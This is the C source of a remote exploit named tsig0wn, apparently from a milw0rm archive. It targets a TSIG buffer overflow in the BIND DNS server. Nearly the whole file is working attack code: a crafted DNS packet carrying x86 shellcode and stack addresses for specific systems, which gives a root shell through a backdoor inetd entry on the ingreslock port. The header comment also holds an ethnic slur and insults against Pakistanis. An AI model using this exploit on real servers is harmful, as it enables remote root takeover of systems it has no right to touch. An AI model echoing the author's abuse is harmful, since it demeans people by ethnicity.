/*
 * tsig0wn.c
 * Copyright Field Marshal August Wilhelm Anton Count Neithardt von Gneisenau
 * gneisenau@berlin.com
 * The author is not and will not be held responsible for the action of 
 * other people using this code.
 * provided for informational purposes only
 * since a greetz section is de rigeur
 * greets to my luv scharnie, sheib, darkx, famzah, brainstorm, ghQst, robbot, ......
 * a special fuck to all pakis including those idiots from GForce, etc....
 * but then pakistan is one big village comprising exclusively of prize idiots
 * tabstop set at 3
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include	<netdb.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

/*
 * This shellcode sux. cant ever get around to coding another one.
 */
char shellcode[] = {
0xeb,0x3b,0x5e,0x31,0xc0,0x31,0xdb,0xb0,0xa0,0x89,
0x34,0x06,0x8d,0x4e,0x07,0x88,0x19,0x41,0xb0,0xa4,						
0x89,0x0c,0x06,0x8d,0x4e,0x0a,0x88,0x19,0x41,0xb0,
0xa8,0x89,0x0c,0x06,0x31,0xd2,0xb0,0xac,0x89,0x14,
0x06,0x89,0xf3,0x89,0xf1,0xb0,0xa0,0x01,0xc1,0xb0,
0x0b,0xcd,0x80,0x31,0xc0,0xb0,0x01,0x31,0xdb,0xcd,
0x80,0xe8,0xc0,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,
0x2f,0x73,0x68,0xff,0x2d,0x63,0xff,		
0x2f,0x62,0x69,0x6e,0x2f,0x65,0x63,0x68,0x6f,0x20,0x27,0x69,
0x6e,0x67,0x72,0x65,0x73,0x6c,0x6f,0x63,0x6b,0x20,0x73,0x74,
0x72,0x65,0x61,0x6d,0x20,0x74,0x63,0x70,0x20,0x6e,0x6f,0x77,
0x61,0x69,0x74,0x20,0x72,0x6f,0x6f,0x74,0x20,0x2f,0x62,0x69,
0x6e,0x2f,0x62,0x61,0x73,0x68,0x20,0x62,0x61,0x73,0x68,0x20,
0x20,0x2d,0x69,0x27,0x3e,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,
0x6e,0x65,0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x3b,0x20,0x2f,
0x75,0x73,0x72,0x2f,0x73,0x62,0x69,0x6e,0x2f,0x69,0x6e,0x65,
0x74,0x64,0x20,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,0x6e,0x65,
0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x00,
};

#define NS_T_TSIG 250
#define SHELLCODE_OFFSET 13
#define DUMMY_ARG_OFFSET 176
#define ENUM_FILE 1				//eventlib_p.h line 141


struct {
	char 				*system_name;
	unsigned int	buffer_start;			/* the address where out buffer starts in memory */
	unsigned int	frame_pointer;			/* content of the frame pointer */
	int				garbage_len;			/* length of the garbage in which we will embed ebp|eip */
} system[] =	{
						{ "Test value 1", 0xbffff640, 0xbffff868, 326, },
						{ "Test value 2", 0xbffff5f0, 0xbffff700, 326, },
						{ "Slackware 7.0", 0xbffff590, 0xbffff7e8, 326, },
						{ NULL, 0x0, 0x0, },
					};

void usage (void);
void encode_dns_name (char *, int, int);

int
main (int argc, char *argv[])
{
	char 						query[PACKETSZ];	// construct our query packet here
	char						*query_ptr;		// pointer to walk the query buffer
	HEADER					*hdr_ptr;		// pointer to the header part of the query buffer

	int						arg;
	unsigned int			buffer_start, 
								frame_pointer, // value the frame pointer will have
								shellcode_addr; // address our shellcode will have in the named buffer calculated from buffer_start
	int						index;

	char						*target_name;
	struct hostent			*target_host;	
	struct sockaddr_in	target;		
	int						sockfd;

	if (argc < 2)
		usage ();

	while ((arg = getopt (argc, argv, "b:f:s:")) != -1) {
		switch (arg){
			case 'b':	sscanf (optarg, "%x", &buffer_start);
							break;
			case 'f':	sscanf (optarg, "%x", &frame_pointer);
							break;
			case 's':	index = atoi (optarg) - 1; 
							buffer_start = system[index].buffer_start;
							frame_pointer = system[index].frame_pointer;
							break;
			default :	usage ();
		}
	}
	if (!(target_name = argv[optind])){
		fprintf (stderr, "tsig0wn: abysmal m0r0n error\n");
		exit (1);
	}

/*
 * Form a header. 
 */
 	memset (query, 0, PACKETSZ);
 	// cud blow up on other architectures not as liberal as x86. an union like in the bind sources is the correct way to go.
	hdr_ptr = (HEADER *)query;
	hdr_ptr->id = htons (0x1234);			
	hdr_ptr->qr = 0;					
	hdr_ptr->opcode = 0;					
	hdr_ptr->qdcount = htons (2);			
	hdr_ptr->arcount = htons (1);	


/*
 * Form a query after the header where we put in the shellcode
 */
	query_ptr = (char *) (hdr_ptr + 1);
	memcpy (query_ptr, shellcode, strlen (shellcode)+1);
	query_ptr += strlen (shellcode) + 1;
	PUTSHORT (T_A, query_ptr);
	PUTSHORT (C_IN, query_ptr);

/*
 * we form another header here that contains garbage with embedded stuff
 * i cud have put this in the same header as the shellcode and have the
 * shellcode nullify. (shrug)
 */
	{
		char *tmp;
		unsigned long dummy_argument = buffer_start+DUMMY_ARG_OFFSET;

		frame_pointer &= 0xffffff00; // zero out the LSB like the overflow in ns_sign will do

		// this will make layout a domain name for the second query, within which
		// we will embed our ebp | eip
		encode_dns_name (query_ptr, system[index].garbage_len, (frame_pointer - buffer_start) - (query_ptr - query));
		query_ptr += system[index].garbage_len;

		shellcode_addr = buffer_start + SHELLCODE_OFFSET;
		printf ("buffer starts at address = 0x%x\n", buffer_start);
		printf ("saved frame pointer after overwrite = 0x%x\n", frame_pointer);
		printf ("shellcode will reside at address = 0x%x\n", shellcode_addr);
		printf ("dummy argument will reside at address = 0x%x\n", dummy_argument);
		// put in the type member of evEvent_p. File is what we need
		tmp = query + DUMMY_ARG_OFFSET;
		tmp[0] = ENUM_FILE;
		tmp[1] = ENUM_FILE >> 8;
		tmp[2] = ENUM_FILE >> 16;
		tmp[3] = ENUM_FILE >> 24;

		// embed the addresses. These will be interpreted as ebp and eip. 
		// we put the address where our shellcode will be situated twice.
		// we overflow the saved frame pointer of datagram_read(). when the
		// function returns to __evDispatch() it calls __evDrop().
		// because we have shifted the frame pointer and thus __evDispatch()
		// notion of the stack we also provide two pointers as arguments to
		// __evDispatch. These pointers point to the start of this query header
		// name, within which __evDrop will look for evEvent_p->type. we set
		// type to be of type 'file' above which causes it to break and execute 
		// FREE() which in turn calls free().
		tmp = query + (frame_pointer - buffer_start);	// advance the ptr to the place where we put in our ebp|eip
		tmp[0] = shellcode_addr;
		tmp[1] = shellcode_addr >> 8;
		tmp[2] = shellcode_addr >> 16;
		tmp[3] = shellcode_addr >> 24;
		tmp[4] = shellcode_addr;
		tmp[5] = shellcode_addr >> 8;
		tmp[6] = shellcode_addr >> 16;
		tmp[7] = shellcode_addr >> 24;

		tmp[8] = dummy_argument;
		tmp[9] = dummy_argument >> 8;
		tmp[10] = dummy_argument >> 16;
		tmp[11] = dummy_argument >> 24;
		tmp[12] = dummy_argument;
		tmp[13] = dummy_argument >> 8;
		tmp[14] = dummy_argument >> 16;
		tmp[15] = dummy_argument >> 24;
	}
	PUTSHORT (T_A, query_ptr);
	PUTSHORT (C_IN, query_ptr);
/*
 * Additional section containing T_SIG stuff
 */
 	// a name with only one char
	memcpy (query_ptr, "\x01m\x00", 3); 
	query_ptr+=3;
	PUTSHORT (NS_T_TSIG, query_ptr);
	PUTSHORT (C_IN, query_ptr);
// these members wont be checked at all as find_key returns NULL on testing secretkey_info. 
//	PUTLONG (0, query_ptr);			
//	PUTSHORT (0, query_ptr);				

/*
 * Connect and deliver the payload
 */
	if (!(target_host = gethostbyname (target_name))){
		fprintf (stderr, "host name resolution error for %s: %s\n", target_name, hstrerror (h_errno));
		exit (1);
	}
	if ((sockfd = socket (PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0){
		perror ("socket");
		exit (1);
	}
	memset (&target, 0, sizeof (target));
	target.sin_family = AF_INET;
	target.sin_port = htons (53);
	target.sin_addr.s_addr = ((struct in_addr *)target_host->h_addr_list[0])->s_addr;

	if (connect (sockfd, &target, sizeof (target)) < 0){
		perror ("connect");
		exit (1);
	}
	if (send (sockfd, query, query_ptr - query, 0) < 0){
		perror ("send");
		exit (1);
	}
	exit (0);
}


void 
usage (void)
{
	int i;
	fprintf (stderr, "                             tsig0wn\n");
	fprintf (stderr, "Copyright Field Marshal August Wilhelm Anton Count Neithardt von Gneisenau\n");
	fprintf (stderr, "\nAvailable System Types\n");
	for (i = 0; system[i].system_name; i++)
		fprintf (stderr, "%d. %s\n", i+1, system[i].system_name);
	fprintf (stderr, "\nUsage:\n");
	fprintf (stderr, "tsig0wn [ -s system type ] target\nor\n");
	fprintf (stderr, "tsig0wn [ -b buffer start address ] [ -f frame pointer content ] target\n");
	exit (1);
}

/*
 * a pretty convoluted function.
 * len is the number of octects to fill in (including the length octect)
 * embed_pos is the position where we need to embed this |len|ebp|eip|. 
 *	Hopefully when we overwrite the saved ebp on the stack
 * we expect it to point here and take the eip (which in turn points to our
 * shellcode) from here. The challenge here is to lay out the octets so 
 * that it doesnt clash with embed_pos.
 */

void
encode_dns_name (char *buf, int len, int embed_pos)
{
	int	ctr = 0;
	int	adjusted = 0;
	embed_pos -= 2;		// our ebp | eip needs the length octet before it, so adjust for it now + 1 
	len--;					// for the NULL octet at the end.

	// sanity check
	if (embed_pos >= len){
		fprintf (stderr, "encode_dns_name: embed_pos >= len\n");
		exit (1);
	}
	while (ctr < len)
		// max 63 octets allowed + preceding 1 octet for length
		if (ctr+64 <= len){ 	// enough space for another 63+1
			if (ctr+64 <= embed_pos || adjusted){	// embed_pos not in between
				*buf++ = 63;
				memset (buf, 'g', 63); buf += 63;
				ctr+=64; 
			}
			else {				// need to adjust cuz embed_pos in between
				*buf++ = embed_pos-ctr-1;
				memset (buf, 'o', embed_pos-ctr-1); buf += embed_pos-ctr-1; 
				ctr+= embed_pos-ctr; 
				adjusted++;
			}
		}
		else {
			if (len - ctr <= embed_pos || adjusted){ // only remaining len - ctr
				*buf++ = len-ctr-1;
				memset (buf, 'g', len-ctr-1);
				ctr += 63; // we are quitting anyway after this. no need to update ctrs
			}
			else{
				*buf++ = embed_pos-len-ctr-1;
				memset (buf, 'o', embed_pos-len-ctr-1); buf += embed_pos-len-ctr-1; 
				ctr += embed_pos-len-ctr; 
				adjusted++;
			}
		}
	*buf=0x00; 	// finish with a 0 
}


// milw0rm.com [2001-03-01]
